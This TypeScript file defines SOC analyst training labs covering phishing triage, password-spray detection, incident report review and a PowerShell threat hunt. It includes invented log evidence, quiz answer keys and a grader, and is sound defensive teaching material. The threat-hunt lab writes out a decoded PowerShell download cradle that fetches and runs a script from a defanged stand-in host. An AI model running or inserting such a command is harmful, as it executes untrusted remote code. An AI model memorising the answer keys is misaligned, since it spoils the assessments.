// Free SOC labs. All data is invented for training (documentation IP ranges, example domains).
// Answers live only on the server: the client receives questions without `answer`/`explanation` until it submits.

export type LabQuestion = { id: string; prompt: string; type: "choice" | "text"; options?: string[]; answer: number | string[]; explanation: string; hint?: string };
export type SiemEvent = { time: string; type: string; user: string; src: string; host: string; result: string; detail: string };
export type Lab = {
  slug: string; title: string; summary: string; minutes: number; level: "Beginner" | "Intermediate"; skills: string[];
  briefing: string; evidence: { label: string; lines: string[] }[]; events?: SiemEvent[]; questions: LabQuestion[];
  next: { href: string; label: string };
};

const spray: SiemEvent[] = [];
const users = ["a.reid", "b.singh", "c.mwangi", "d.novak", "e.costa", "f.ahmed", "g.lindqvist", "h.tran", "i.petrov", "j.okafor", "k.yamada", "l.fischer", "m.chen", "n.dubois"];
users.forEach((u, i) => spray.push({ time: `08:${String(10 + i * 2).padStart(2, "0")}:${String((i * 17) % 60).padStart(2, "0")}`, type: "auth", user: u, src: "203.0.113.77", host: "vpn-gw-01", result: "failure", detail: "event_id=4625 reason=bad_password" }));
for (let i = 0; i < 9; i++) spray.push({ time: `08:0${i}:1${i}`, type: "auth", user: "svc_print", src: "10.20.4.17", host: "print-01", result: "failure", detail: "event_id=4625 reason=expired_password" });

export const LABS: Lab[] = [
  {
    slug: "phishing-triage", title: "Phishing triage: the overdue invoice", minutes: 20, level: "Beginner", skills: ["Email headers", "URL analysis", "Scoping"],
    summary: "A finance employee reports a suspicious invoice email. Read the headers and the link, reach a verdict and decide what to do.",
    briefing: `**Scenario.** At 10:05 UTC a finance assistant forwards an email to the security mailbox with the note *“Is this real? I haven't clicked anything.”*\n\nYour job: decide whether it is malicious, explain why, and choose the right response. Work only from the evidence shown — never visit suspicious links on your own machine.`,
    evidence: [
      { label: "Message headers", lines: [
        'From: "Accounts — Northwind Supplies" <billing@northwind-supplies.example>',
        "Reply-To: accounts.northwind@freemail.example",
        "Return-Path: <bounce@mail.nw-billing.example>",
        "To: finance@yourcompany.example",
        "Subject: OVERDUE: Invoice INV-20931 — action required today",
        "Date: Tue, 03 Nov 2026 09:58:12 +0000",
        "Received: from mail.nw-billing.example (198.51.100.44)",
        "Authentication-Results: spf=pass smtp.mailfrom=mail.nw-billing.example;",
        "    dkim=none; dmarc=fail header.from=northwind-supplies.example",
      ] },
      { label: "Message body (rendered as text)", lines: [
        "Dear Customer,",
        "",
        "Our records show invoice INV-20931 is 14 days overdue. To avoid suspension",
        "of your account please review the invoice and confirm payment today.",
        "",
        "[ View invoice ]  ->  hxxps://northwind-supplies.sharepoint.com.docs-view[.]example/login?id=20931",
        "",
        "Accounts Team",
      ] },
      { label: "Mail gateway search — same sender, last 24 h", lines: [
        "recipient                       delivered   clicked",
        "finance@yourcompany.example     09:58       no",
        "payroll@yourcompany.example     09:58       yes (10:01)",
        "ceo.office@yourcompany.example  09:59       no",
      ] },
    ],
    questions: [
      { id: "q1", type: "choice", prompt: "SPF shows “pass”. What does that actually prove here?", options: ["The email is safe", "The sending server is authorised for mail.nw-billing.example — not for the visible From domain", "The message was signed by Northwind Supplies", "The link has been scanned"], answer: 1, explanation: "SPF validates the envelope (Return-Path) domain. It passed for mail.nw-billing.example, which the attacker controls. It does not align with the From domain, so DMARC fails." },
      { id: "q2", type: "text", prompt: "What is the registered domain the “View invoice” link really goes to? (Type it without brackets.)", answer: ["docs-view.example", "docs-view[.]example"], hint: "Read right to left from the first single slash.", explanation: "Everything before docs-view.example (northwind-supplies.sharepoint.com.) is a sub-domain chosen to look familiar. The registered domain is docs-view.example." },
      { id: "q3", type: "choice", prompt: "Which header comparison is the strongest single indicator of deception?", options: ["Date vs Received time", "From vs Reply-To vs Return-Path all on different domains", "Subject is in capitals", "The To address is a shared mailbox"], answer: 1, explanation: "Three different domains for From, Reply-To and Return-Path — including a free webmail reply address — is a classic sign that replies and bounces are being diverted." },
      { id: "q4", type: "text", prompt: "Which mailbox needs urgent follow-up, and why? (Type the mailbox name before the @.)", answer: ["payroll"], hint: "Check the gateway search.", explanation: "payroll clicked the link at 10:01. You must establish whether credentials were entered and review that account's sign-ins — the reporter did the right thing; the clicker is the risk." },
      { id: "q5", type: "choice", prompt: "What is the best next action?", options: ["Reply to the sender asking if it is genuine", "Open the link in your browser to see the page", "Purge the message from all mailboxes, block the sender and URL, and investigate the payroll account", "Close the ticket because the reporter did not click"], answer: 2, explanation: "Contain first: remove the message everywhere, block the indicators, then scope the user who clicked (sign-in logs, password reset, session revocation if credentials were submitted)." },
    ],
    next: { href: "/academy/soc-labs/siem-brute-force", label: "Next lab: find the attack in a SIEM" },
  },
  {
    slug: "siem-brute-force", title: "SIEM lab: brute force or password spray?", minutes: 25, level: "Beginner", skills: ["Log search", "Aggregation", "Authentication analysis"],
    summary: "Use a mini SIEM to search a morning of authentication events, identify two different attack patterns and find out whether either succeeded.",
    briefing: `**Scenario.** The overnight analyst left a note: *“Lots of failed logins this morning, didn't have time to look.”*\n\nUse the event explorer below. You can type filters such as \`result=failure\`, \`src=203.0.113.77\` or \`user=m.chen\`, combine them with spaces, and use **Count by** to aggregate.\n\n**Tip:** count failures by \`src\`, then look at how many *different users* each source targeted.`,
    evidence: [],
    events: [
      { time: "07:52:10", type: "auth", user: "m.chen", src: "10.20.9.31", host: "WS-077", result: "success", detail: "event_id=4624 logon_type=2" },
      { time: "07:55:42", type: "auth", user: "a.reid", src: "10.20.9.12", host: "WS-012", result: "success", detail: "event_id=4624 logon_type=2" },
      ...spray,
      { time: "08:39:12", type: "auth", user: "m.chen", src: "203.0.113.77", host: "vpn-gw-01", result: "success", detail: "event_id=4624 logon_type=3" },
      { time: "08:41:30", type: "vpn", user: "m.chen", src: "203.0.113.77", host: "vpn-gw-01", result: "success", detail: "session_start assigned_ip=10.99.0.45" },
      { time: "08:44:05", type: "auth", user: "m.chen", src: "10.99.0.45", host: "FS02", result: "success", detail: "event_id=4624 logon_type=3 share=\\\\FS02\\Finance" },
      { time: "08:47:51", type: "file", user: "m.chen", src: "10.99.0.45", host: "FS02", result: "success", detail: "read count=412 path=\\Finance\\Payroll\\2026" },
      { time: "09:02:00", type: "auth", user: "j.okafor", src: "10.20.9.44", host: "WS-044", result: "failure", detail: "event_id=4625 reason=bad_password" },
      { time: "09:02:09", type: "auth", user: "j.okafor", src: "10.20.9.44", host: "WS-044", result: "success", detail: "event_id=4624 logon_type=2" },
    ].sort((a, b) => a.time.localeCompare(b.time)),
    questions: [
      { id: "q1", type: "text", prompt: "Which source IP address is performing a password spray?", answer: ["203.0.113.77"], hint: "Filter result=failure and count by src, then count by user for each source.", explanation: "203.0.113.77 produced one failed logon against each of 14 different accounts — few attempts per account, many accounts: password spraying." },
      { id: "q2", type: "choice", prompt: "10.20.4.17 also has many failures. What is the most likely explanation?", options: ["A second password spray", "A single service account with an expired password retrying — an operational issue, not an attack", "Impossible travel", "Data exfiltration"], answer: 1, explanation: "All nine failures are for svc_print from an internal host with reason=expired_password. That is a misconfigured service. Raise it with IT, but it is not the attack." },
      { id: "q3", type: "text", prompt: "Which user account did the attacker successfully log in as?", answer: ["m.chen", "mchen"], hint: "Filter src=203.0.113.77 result=success.", explanation: "m.chen authenticated successfully from 203.0.113.77 at 08:39:12 — after being one of the sprayed accounts." },
      { id: "q4", type: "text", prompt: "Which server did the attacker access after connecting to the VPN?", answer: ["fs02"], hint: "Follow the assigned VPN address 10.99.0.45.", explanation: "From the VPN-assigned address 10.99.0.45 the account authenticated to FS02 and read 412 files under \\Finance\\Payroll." },
      { id: "q5", type: "choice", prompt: "What do you do first?", options: ["Wait to see whether it happens again", "Disable or reset m.chen and revoke the VPN session, then scope what was read on FS02", "Block 10.20.4.17", "Email m.chen to ask whether it was them"], answer: 1, explanation: "This is a confirmed account compromise with data access. Contain the identity and session immediately, block the source, then scope the file access and escalate as an incident." },
    ],
    next: { href: "/academy/soc-labs/incident-report-review", label: "Next lab: review an incident report" },
  },
  {
    slug: "incident-report-review", title: "Incident report review: spot what is missing", minutes: 15, level: "Beginner", skills: ["Reporting", "Timeline", "Communication"],
    summary: "Read a junior analyst's draft incident report and identify what makes it weak — the same review you will receive on your own reports.",
    briefing: `**Scenario.** A new analyst has drafted a report for the password-spray incident from the previous lab and asked you to review it before it goes to the security manager.\n\nA good report separates fact from assessment, gives a timeline with a time zone, states scope, and makes specific, owned recommendations.\n\nCompare this draft with our [sample incident report](/academy/resources/sample-incident-report).`,
    evidence: [
      { label: "Draft incident report", lines: [
        "INCIDENT REPORT — hacking attempt",
        "",
        "Summary: This morning a hacker definitely from Russia got into our network and",
        "stole the payroll. It was really bad. I blocked it.",
        "",
        "What happened: Lots of failed logins then m.chen logged in from a weird IP",
        "around 8:40. Then files got accessed.",
        "",
        "Impact: Unknown but probably everything.",
        "",
        "Actions: Blocked the IP.",
        "",
        "Recommendations: Users should use better passwords. Be more careful.",
      ] },
    ],
    questions: [
      { id: "q1", type: "choice", prompt: "What is wrong with “a hacker definitely from Russia”?", options: ["Nothing — attribution is expected in every report", "It states an unsupported assessment as fact; the evidence shows only a source IP address", "It should name the hacker", "It is too short"], answer: 1, explanation: "An IP address does not establish who or where an attacker is. Report facts (source address 203.0.113.77) and label any assessment as such, with a confidence level." },
      { id: "q2", type: "choice", prompt: "What is the most important thing missing from “What happened”?", options: ["A timestamped timeline with a stated time zone", "More adjectives", "The analyst's opinion of the user", "A longer subject line"], answer: 0, explanation: "“Around 8:40” is not usable. A timeline should list each event with a precise time and time zone: spray start, successful logon, VPN session, file access." },
      { id: "q3", type: "choice", prompt: "How should the impact section be written?", options: ["“Probably everything”", "State what is known (412 files read under \\Finance\\Payroll by m.chen's session) and what is not yet determined", "Leave it blank until the investigation is finished", "Describe the worst case as fact"], answer: 1, explanation: "Scope precisely what the evidence shows and state the gaps honestly, for example whether files were copied out of the network." },
      { id: "q4", type: "choice", prompt: "Which containment action is missing from “Actions”?", options: ["Rebooting the file server", "Resetting m.chen's credentials and revoking the active VPN session", "Deleting the logs", "Informing the attacker"], answer: 1, explanation: "Blocking one IP does not remove the attacker's access: they hold valid credentials and an active session. The identity must be contained." },
      { id: "q5", type: "choice", prompt: "Which recommendation is the most useful replacement for “use better passwords”?", options: ["“Be more careful”", "“Require MFA on the VPN gateway (owner: Identity team, priority: high) and alert on one source failing against 10+ accounts”", "“Buy more security tools”", "“Punish the user”"], answer: 1, explanation: "Good recommendations are specific, owned and prioritised, and address the root cause — here, single-factor VPN access and no spray detection." },
    ],
    next: { href: "/academy/soc-labs/threat-hunt-powershell", label: "Next lab: hunt suspicious PowerShell" },
  },
  {
    slug: "threat-hunt-powershell", title: "Threat hunt: Office spawning PowerShell", minutes: 20, level: "Intermediate", skills: ["Process analysis", "MITRE ATT&CK", "Baselining"],
    summary: "Test a hunting hypothesis against process-creation data: separate legitimate encoded PowerShell from a malicious document launching a download cradle.",
    briefing: `**Hypothesis.** *If a user opened a malicious document, an Office application will have launched a script interpreter with obfuscated arguments.*\n\nYou have one day of process-creation results where the child process is \`powershell.exe\`. Not everything unusual is malicious — part of hunting is knowing your baseline.\n\nThe Base64 in row 3 decodes (UTF-16LE) to: \`IEX (New-Object Net.WebClient).DownloadString('hxxp://cdn-update[.]example/a.ps1')\``,
    evidence: [
      { label: "Process creation — child = powershell.exe", lines: [
        "#  host      user       parent            command_line",
        "1  WS-021    t.hall     explorer.exe      powershell.exe -File C:\\IT\\Scripts\\map-drives.ps1",
        "2  SRV-APP3  SYSTEM     sccm-agent.exe    powershell.exe -NoProfile -EncodedCommand JABlAHIAcgBvAHIA…  (seen on 412 hosts)",
        "3  WS-077    m.chen     WINWORD.EXE       powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA…",
        "4  WS-103    it.admin   powershell_ise    powershell.exe Get-ADUser -Filter * -Properties LastLogonDate",
        "",
        "Follow-on activity on WS-077 (same minute):",
        "5  WS-077    m.chen     powershell.exe    rundll32.exe C:\\Users\\m.chen\\AppData\\Local\\Temp\\k3.dll,Start",
        "6  WS-077    network    rundll32.exe      connect 198.51.100.9:443 every 60s",
      ] },
    ],
    questions: [
      { id: "q1", type: "text", prompt: "Which row number is the strongest lead for your hypothesis?", answer: ["3", "row 3", "#3"], explanation: "Row 3: Word (WINWORD.EXE) launching PowerShell with no profile, a hidden window and an encoded command. Office applications should not normally start PowerShell." },
      { id: "q2", type: "choice", prompt: "Row 2 also uses an encoded command. Why is it probably benign?", options: ["Encoded commands are always safe on servers", "The parent is the software-management agent and the identical command appears on 412 hosts — it matches the baseline", "It runs as SYSTEM", "It has -NoProfile"], answer: 1, explanation: "Baseline matters. Management tooling routinely uses encoded PowerShell. Confirm by decoding the command and checking the agent's signature — but prevalence and parent make it expected behaviour." },
      { id: "q3", type: "choice", prompt: "What does the decoded command in row 3 do?", options: ["Maps network drives", "Downloads a script from a remote server and executes it in memory", "Lists Active Directory users", "Clears the event log"], answer: 1, explanation: "IEX (Invoke-Expression) with Net.WebClient.DownloadString is a classic download cradle: fetch and run code without writing the script to disk." },
      { id: "q4", type: "text", prompt: "Which MITRE ATT&CK technique ID covers PowerShell execution? (Format T####.###)", answer: ["t1059.001", "t1059"], hint: "Command and Scripting Interpreter has sub-techniques.", explanation: "T1059.001 — Command and Scripting Interpreter: PowerShell. The Word parent also points to T1204.002 (User Execution: Malicious File)." },
      { id: "q5", type: "choice", prompt: "Rows 5 and 6 show rundll32 loading a DLL from Temp and connecting out every 60 seconds. What is this most consistent with?", options: ["A Windows update", "A second-stage implant beaconing to command and control", "A printer driver", "A backup job"], answer: 1, explanation: "A DLL in the user's Temp folder executed by rundll32, followed by regular outbound connections at a fixed interval, is consistent with an implant beaconing to a C2 server." },
      { id: "q6", type: "choice", prompt: "What should the hunt produce besides containing WS-077?", options: ["Nothing — the hunt is over", "A detection for Office applications spawning script interpreters, and an estate-wide search for the DLL hash and destination", "A ban on PowerShell for all staff", "A new hypothesis only"], answer: 1, explanation: "Good hunts end in durable improvements: scope the incident across the estate and convert the logic into a detection so the next occurrence raises an alert." },
    ],
    next: { href: "/programmes/soc-analyst", label: "Go further: the SOC Analyst Programme" },
  },
];

export const LAB_BY_SLUG = new Map(LABS.map((l) => [l.slug, l]));

const norm = (v: string) => v.toLowerCase().replace(/[\[\]\s]/g, "").replace(/^hxxps?:\/\//, "").replace(/\.$/, "");

export type LabResult = { score: number; max: number; results: { id: string; correct: boolean; explanation: string; expected: string }[] };

export function gradeLab(lab: Lab, answers: Record<string, string>): LabResult {
  const results = lab.questions.map((q) => {
    const given = answers[q.id] ?? "";
    const correct = q.type === "choice" ? Number(given) === q.answer && given !== "" : (q.answer as string[]).some((a) => norm(a) === norm(given));
    const expected = q.type === "choice" ? q.options![q.answer as number] : (q.answer as string[])[0];
    return { id: q.id, correct, explanation: q.explanation, expected };
  });
  return { score: results.filter((r) => r.correct).length, max: results.length, results };
}

/** Strips answers and explanations before a lab is sent to the browser. */
export const publicQuestions = (lab: Lab) => lab.questions.map(({ id, prompt, type, options, hint }) => ({ id, prompt, type, options, hint }));
